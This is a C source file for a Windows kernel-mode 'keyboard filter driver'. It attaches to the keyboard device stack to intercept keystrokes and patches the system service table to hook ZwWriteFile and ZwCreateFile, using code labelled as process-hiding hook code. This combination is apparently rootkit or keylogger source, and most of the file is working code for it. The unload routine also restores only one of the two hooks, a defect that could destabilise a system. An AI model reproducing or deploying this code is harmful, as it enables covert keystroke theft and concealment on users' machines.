/*
 * Module: obdriver.c
 * Author: Christopher Wood
 * Description: Outbond Keyboard Filter Driver. This file holds the driver
 *              entry point, basic request dispatch, and unload functions.
 * Environment: Kernel mode only
 */

#include "driver.h"
#include "hook.h"
#include "scancode.h"
#include "thread.h"

ZWWRITEFILE   OldZwWriteFile;
ZWCREATEFILE  OldZwCreateFile;
extern        numPendingIrps;

/*
 * DriverEntry initializes the driver and is the first routine called by the
 * system after the driver is loaded. DriverEntry specifies the other entry
 * points in the function driver, such as EvtDevice and DriverUnload.
 *
 * @param DriverObject - represents the instance of the function driver that is loaded
 *   into memory. DriverEntry must initialize members of DriverObject before it
 *   returns to the caller. DriverObject is allocated by the system before the
 *   driver is loaded, and it is released by the system after the system unloads
 *   the function driver from memory.
 * @param RegistryPath - represents the driver specific path in the Registry.
 *   The function driver can use the path to store driver related data between
 *   reboots. The path does not store hardware instance specific data.
 *
 * @return STATUS_SUCCESS if successful, STATUS_UNSUCCESSFUL otherwise
 */
NTSTATUS
DriverEntry(
    IN PDRIVER_OBJECT pDriverObject,
    IN PUNICODE_STRING RegistryPath
    )
{
    // Local variables
    NTSTATUS          status;
	PDEVICE_EXTENSION devExt;
	PDEVICE_OBJECT    devObj;
	UNICODE_STRING    devName;
	UNICODE_STRING    linkName;
	int               counter;

	DbgPrint("%s - version %s", NAME, VERSION);
	DbgPrint("Built %s %s\n", __DATE__, __TIME__);

	// Set the basic dispatch routines for all IRPs handled
	for (counter = 0; counter < IRP_MJ_MAXIMUM_FUNCTION; counter++)
	{
		pDriverObject->MajorFunction[counter] = OutboundDispatchPassDown;
	}

	// Set a specific dispatch routine for read requests
	pDriverObject->MajorFunction[IRP_MJ_READ] = OutboundDispatchRead;

	// Hook the keyboard stack
	status = OutboundHookKeyboard(pDriverObject);
	if (!NT_SUCCESS(status))
		DbgPrint("Error hooking the keyboard.\n");
	else
		DbgPrint("Successfully hooked the keyboard.\n");

	// Save old system call locations
	OldZwWriteFile = (ZWWRITEFILE)(SYSTEMSERVICE(ZwWriteFile));
	OldZwCreateFile = (ZWCREATEFILE)(SYSTEMSERVICE(ZwCreateFile));

	//***Begin HideProcessHookMDL SSDT hook code***

	// Map the memory into our domain so we can change the permissions on the MDL.
	g_pmdlSystemCall = MmCreateMdl(NULL,
								KeServiceDescriptorTable.ServiceTableBase,
								KeServiceDescriptorTable.NumberOfServices * 4);
    if(!g_pmdlSystemCall)
	{
	    DbgPrint("Failed mapping memory...");
		return STATUS_UNSUCCESSFUL;
	}

	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

	// Change the flags of the MDL
	g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode); //TODO: use MmMapLockedPagesSpecifyCache instead, MmMapLockedPages is obselete according to OACR

	// Hook the system call
	_asm{cli}
	HOOK_SYSCALL(ZwWriteFile, NewZwWriteFile, OldZwWriteFile);
	HOOK_SYSCALL(ZwCreateFile, NewZwCreateFile, OldZwCreateFile);
	_asm{sti}

	//***End HideProcessHookMDL SSDT hook code***

	// Set the driver unload routine
	pDriverObject->DriverUnload = Unload;

	return STATUS_SUCCESS;
} // DriverEntry

/*
 * Generic dispatch routine for IRP major functions other than
 * IRP_MJ_READ. This routine will simply pass the request to the
 * next lowest driver on the stack.
 *
 * @param pDeviceObject - TODO
 * @param pIrp - TODO
 *
 * @return
 */
NTSTATUS
OutboundDispatchPassDown(
    IN PDEVICE_OBJECT pDeviceObject,
    IN PIRP pIrp
    )
{
    // Local variable for device extension
	PDEVICE_EXTENSION devExt;

    // Retrieve pointer to device extension
	devExt = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	// Pass the IRP down to the target below
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(devExt->pKeyboardDevice, pIrp);
} // OutboundDispatchPassDown

/*
 * TODO
 *
 * @param pDriverObject - TODO
 *
 * @return VOID
 */

VOID
Unload(
    IN PDRIVER_OBJECT pDriverObject
    )
{
    // Local variables
	KTIMER            timer; // timer to wait for IRPs to die
	LARGE_INTEGER     timeout; // timeout for the timer
	PDEVICE_EXTENSION pKeyboardDeviceExtension;

	DbgPrint("Begin DriverUnload routine.\n");

	// Get the pointer to the device extension
	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	// Detach from the device underneath that we're hooked to
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);

	//***Begin HideProcessHookMDL SSDT hook code***

	// Unhook SSDT call, disable interrupts first
	_asm{cli}
	UNHOOK_SYSCALL(ZwWriteFile, OldZwWriteFile, NewZwWriteFile);
	_asm{sti}

	// Unlock and free MDL
	if(g_pmdlSystemCall)
    {
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
    }
	//*** End HideProcessHookMDL SSDT hook code***

	// Initialize a timer
	timeout.QuadPart = 1000000;
	KeInitializeTimer(&timer);

    // Wait for pending IRPs to finish
	while (numPendingIrps > 0)
	{
		KeSetTimer(&timer, timeout, NULL);
		KeWaitForSingleObject(&timer, Executive, KernelMode, FALSE, NULL);
	}

	// Delete the device
	IoDeleteDevice(pDriverObject->DeviceObject);

	//TODO: clean up any remaining resources, close any files, etc..

	// Done.
	return;
} // Unload
